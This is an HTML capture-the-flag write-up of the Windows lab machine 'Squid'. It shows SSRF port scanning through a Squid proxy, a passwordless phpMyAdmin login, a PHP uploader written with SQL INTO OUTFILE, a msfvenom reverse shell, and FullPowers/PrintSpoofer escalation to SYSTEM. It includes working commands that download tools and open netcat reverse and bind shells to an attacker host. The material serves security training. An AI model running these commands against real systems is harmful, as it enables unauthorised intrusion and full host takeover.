@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Squid &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Windows</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Squid</h1>
+    <div class="meta">Target: <code>192.168.229.189</code></div>
+    <div class="tags"><span class="tag">Windows</span><span class="tag">SquidProxy</span><span class="tag">SSRF</span><span class="tag">phpMyAdmin</span><span class="tag">SQLFileWrite</span><span class="tag">ServiceAccount</span><span class="tag">FullPowers</span><span class="tag">SeImpersonate</span><span class="tag">PrintSpoofer</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#nmap">Nmap</a><a class="lvl3" href="#squid-proxy-internal-port-discovery">Squid Proxy, Internal Port Discovery</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#phpmyadmin-passwordless-root-login">phpMyAdmin, Passwordless Root Login</a><a class="lvl3" href="#sql-into-outfile-php-file-uploader">SQL INTO OUTFILE → PHP File Uploader</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#step-1-fullpowers-restoring-seimpersonateprivilege">Step 1, FullPowers: Restoring SeImpersonatePrivilege</a><a class="lvl3" href="#step-2-printspoofer-seimpersonate-to-system">Step 2, PrintSpoofer: SeImpersonate to SYSTEM</a><a class="lvl2" href="#root-system">Root / SYSTEM</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Squid is a Windows machine where a publicly facing Squid HTTP proxy is the only external entry point, and it becomes the tool used to reach an internal WampServer and its passwordless phpMyAdmin. From phpMyAdmin, a SQL <code>INTO OUTFILE</code> query writes a PHP uploader to the webroot, which gives code execution as <code>NT AUTHORITY\Local Service</code>. Privilege escalation runs two steps: <code>FullPowers.exe</code> restores the service account's stripped <code>SeImpersonatePrivilege</code>, and <code>PrintSpoofer</code> converts that privilege into a SYSTEM shell.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">Nmap</h3>
+<pre><code class="language-sh">PORT     STATE SERVICE       VERSION
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3128/tcp open  http-proxy    Squid http proxy 4.14
+</code></pre>
+<p>Only four ports externally. The Squid proxy on 3128 is both the attack surface and the pivot mechanism. SMB signing not required, but no obvious SMB foothold yet.</p>
+<h3 id="squid-proxy-internal-port-discovery">Squid Proxy, Internal Port Discovery</h3>
+<p>The <code>spose.py</code> script uses Squid as a port scanner against itself, measuring response time differences to detect open internal ports:</p>
+<pre><code class="language-sh">python3 spose.py --proxy http://192.168.229.189:3128 --target 192.168.229.189
+192.168.229.189 3306 seems OPEN
+192.168.229.189 8080 seems OPEN
+</code></pre>
+<blockquote>
+<p><strong>How Squid becomes a port scanner:</strong> Squid forwards HTTP requests on behalf of clients. Pointing it at <code>127.0.0.1:&lt;port&gt;</code> with varying port numbers causes it to either connect (open port) or refuse (closed port), and the timing difference or response codes reveal which ports are listening internally. This is effectively server-side request forgery (SSRF), using the proxy's outbound connectivity to scan what would otherwise be an unreachable network.</p>
+</blockquote>
+<p>With FoxyProxy configured to route through <code>192.168.229.189:3128</code>, browsing to <code>127.0.0.1:8080</code> revealed a WampServer.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="phpmyadmin-passwordless-root-login">phpMyAdmin, Passwordless Root Login</h3>
+<p>The phpMyAdmin service was accessible at:</p>
+<pre><code>http://127.0.0.1:8080/phpmyadmin/
+</code></pre>
+<p>The WampServer installation used the default root configuration: no password. Login succeeded with <code>root</code> and a blank password field.</p>
+<blockquote>
+<p><strong>Why root-with-no-password is common on WampServer:</strong> WampServer is a local development stack that ships with phpMyAdmin pre-configured for the MySQL <code>root</code> account with no password. Developers install it for local testing and never set a root password because it's "just local." When WampServer ends up on a machine with a Squid proxy in front of it, "local only" stops being true.</p>
+</blockquote>
+<h3 id="sql-into-outfile-php-file-uploader">SQL INTO OUTFILE → PHP File Uploader</h3>
+<p>With SQL execution rights as root, a PHP file-upload page was written directly to the WampServer webroot:</p>
+<pre><code class="language-sql">SELECT
+&quot;&lt;?php echo '&lt;form action=\&quot;\&quot; method=\&quot;post\&quot; enctype=\&quot;multipart/form-data\&quot;&gt;';
+echo '&lt;input type=\&quot;file\&quot; name=\&quot;file\&quot;&gt;&lt;input name=\&quot;_upl\&quot; type=\&quot;submit\&quot; value=\&quot;Upload\&quot;&gt;';
+if( $_POST['_upl'] == 'Upload' ) {
+    if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
+        echo 'Upload Done.';
+    } else { echo 'Upload Failed.'; }
+}?&gt;&quot;
+INTO OUTFILE 'C:/wamp/www/uploader.php';
+</code></pre>
+<p>The upload form was then available at:</p>
+<pre><code>http://127.0.0.1:8080/uploader.php
+</code></pre>
+<p>A PHP reverse shell was generated and uploaded through this form:</p>
+<pre><code class="language-sh">msfvenom -p php/reverse_php LHOST=192.168.45.244 LPORT=443 -f raw -o shell.php
+</code></pre>
+<p>Triggering the shell:</p>
+<pre><code>http://127.0.0.1:8080/shell.php
+</code></pre>
+<pre><code class="language-sh">rlwrap nc -lvnp 443
+connect to [192.168.45.244] from (UNKNOWN) [192.168.229.189] 49928
+
+whoami
+nt authority\local service
+</code></pre>
+<pre><code class="language-powershell">type local.txt
+‹redacted›
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="step-1-fullpowers-restoring-seimpersonateprivilege">Step 1, FullPowers: Restoring SeImpersonatePrivilege</h3>
+<p>Service accounts like <code>Local Service</code> and <code>Network Service</code> run with a reduced token, <code>SeImpersonatePrivilege</code> and other rights are present in the account's full token but stripped from the shell token by default. <code>FullPowers.exe</code> exploits a scheduled task creation trick to obtain a fresh, unreduced token for the service account.</p>
+<p>The shell was first upgraded using powercat over a new connection. Then <code>RunFromProcess</code> was used to create a local bind shell from within a privileged process context, and <code>FullPowers</code> was run from there:</p>
+<pre><code class="language-powershell"># Create bind shell from process context
+.\rfp.exe 3636 C:\TOOLS\nc64.exe -l -p 9001 -e cmd
+
+# Connect to bind shell
+.\nc.exe 127.0.0.1 9001
+
+# Download and run FullPowers
+iwr -uri http://192.168.45.244/FullPowers.exe -OutFile fullpowers.exe
+.\fullpowers.exe -c &quot;.\nc.exe 192.168.45.244 8080 -e cmd&quot; -z
+[+] Got new token! Privilege count: 7
+[+] CreateProcessAsUser() OK
+</code></pre>
+<p>The new shell had <code>SeImpersonatePrivilege</code> enabled:</p>
+<pre><code class="language-powershell">C:\Windows\system32&gt;whoami /priv
+
+SeAssignPrimaryTokenPrivilege   Replace a process level token   Enabled
+SeImpersonatePrivilege          Impersonate a client after auth Enabled
+SeCreateGlobalPrivilege         Create global objects           Enabled
+</code></pre>
+<blockquote>
+<p><strong>Why service accounts have SeImpersonatePrivilege in the first place:</strong> Windows grants <code>SeImpersonatePrivilege</code> to service accounts so they can impersonate the client on whose behalf they are acting (e.g., IIS impersonating a web request's auth context). An attacker with this privilege can force a privileged token owner (like SYSTEM) to authenticate to an attacker-controlled named pipe, then impersonate that SYSTEM token. This is the basis of the Potato and PrintSpoofer families of attacks.</p>
+</blockquote>
+<h3 id="step-2-printspoofer-seimpersonate-to-system">Step 2, PrintSpoofer: SeImpersonate to SYSTEM</h3>
+<p>With <code>SeImpersonatePrivilege</code> restored, PrintSpoofer created a named pipe and tricked the Print Spooler service (running as SYSTEM) into authenticating to it, capturing the SYSTEM token:</p>
+<pre><code class="language-powershell">iwr -uri http://192.168.45.244/PrintSpoofer.exe -OutFile printspoofer.exe
+.\printspoofer.exe -c &quot;nc 192.168.45.244 443 -e powershell&quot;
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+</code></pre>
+<h2 id="root-system">Root / SYSTEM</h2>
+<pre><code class="language-sh">rlwrap nc -lvnp 443
+connect to [192.168.45.244] from (UNKNOWN) [192.168.229.189] 49945
+
+PS C:\Windows\system32&gt; whoami
+nt authority\system
+</code></pre>
+<pre><code class="language-powershell">PS C:\Users\Administrator\Desktop&gt; type proof.txt
+‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>A Squid proxy is both attack surface and pivot tool.</strong> <code>spose.py</code> turns the proxy into a port scanner against the host itself, one script, two open internal ports revealed.</li>
+<li><strong>Passwordless phpMyAdmin root plus <code>INTO OUTFILE</code> equals webshell.</strong> MySQL's file-write capability is a shell in one SQL query when the web server runs from the same directory tree.</li>
+<li><strong><code>FullPowers</code> restores what Windows strips from service account shells.</strong> The shell token is a subset of the account's full token. <code>FullPowers</code> recovers it using a scheduled task trick, making <code>SeImpersonatePrivilege</code> usable again.</li>
+<li><strong><code>SeImpersonatePrivilege</code> + PrintSpoofer = SYSTEM.</strong> This chain is reliable on unpatched Windows 10 and Server 2016/2019. If WinPEAS shows <code>SeImpersonatePrivilege: Enabled</code> on a service account, PrintSpoofer is the first tool to try.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
